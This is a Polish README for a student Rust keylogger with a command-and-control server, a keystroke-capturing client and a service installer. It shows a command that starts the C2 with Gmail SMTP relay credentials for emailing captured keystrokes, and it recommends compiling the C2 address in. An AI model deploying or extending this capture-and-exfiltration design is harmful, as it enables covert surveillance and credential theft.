# Prosty keylogger

Prosty keyloigger powstający w ramach nauki windows api i kilku bibliotek Rusta.
Składa się z 4 części (na razie 3)

1. `cc` - Niby serwer Command & Control, ale w obecnym stanie tylko przesyła podstawową konfigurację
2. `client` - Właściwy keylogger do zbierania klawiszy i wysyłania
3. `installer` - Program łączący się z `cc` i pobierający właściwy keylogger i go instalujący
4. `decoder` - __TODO__

## Komponenty 
### `cc`

Należy go umieścić w dostępnym miejscu,  odpali się słuchając na porcie 8080.  
W obecnej wersji przesyła tylko konfigurację klienta, żeby wysyłał mailem.
Hasło do maila trzeba podać. Przykład uruchomienia (przez Cargo) w tym durnym powershellu.
W normalnych systemach zamiast \` będzie się dawało \.
```powershell
cargo run --bin cc -- `
--login prostykeylogger `
--password "aaaa bbbb cccc dddd" ` 
--host-file target/debug/client.exe `
--relay "smtp.gmail.com" `
--from "<prostykeylogger@gmail.com>" `
--to "Admin <prostykeylogger@gmail.com>"
```
Podane hasło to hasło logowania do maila (lub `app password` np w google, które nie pozwala użyć właściwego hasła przez api `smtp`)


### `installer`
Trzeba go uruchomić z uprawnieniami administratora.
Nie działa jeszcze poprawnie bo choć pobiera `clienta` i rejestruje go jako serwis to serwic nie działa.
Jest to prawdopodobnie związane z tym że windows jest durny i go nie używam na codzień, przez co nie wiem jeszcze jak się
robi działające serwisy.
Uruchomiony bez argumentów powinien połączyć się z serwerm `http://localhost:8080`.
W prawdzimym keyloggerze wypadało to zmienić, teraz można go opcją ustawić, ale najeloiej jakby docelowy adres był wkompilowany jako domyślny


W terminalu z uprawnieniami admina:
```powershell
cargo run --bin installer -- 
```

### `client`
Zbiera klucze i wysyła zadanym kanałem (na razie tylko mail jest wspierany).
Uruchamia się, pobiera konfigurację z serwera i ma działać.

Docelowo powiniein być zarejestrowany jako serwic i uruchamiać się przy starcie, ale to jeszcze nie działa.

Ręczne uruchomienie:
```powershell
cargo run --bin client -- 
```
> Musi działać serwer `cc`

A na razie działa tylko do serwera `localhsot:8080`, bo docelowo ma mieć plik w którym jest zapisane gdzie jest serwer, albo wartość wkompilowaną.


## Inspiracja

Na podstawie wpisu [Oded Awaskar](https://www.varonis.com/blog/malware-coding-lessons-people-part-learning-write-custom-fud-fully-undetected-malware).
Tylko że w Rust

## Licencja

__MIT__

Ale proszę wykorzystywać w celu edukacyjnym i nie wykorzystywać w celach robienia ludziom krzywdy.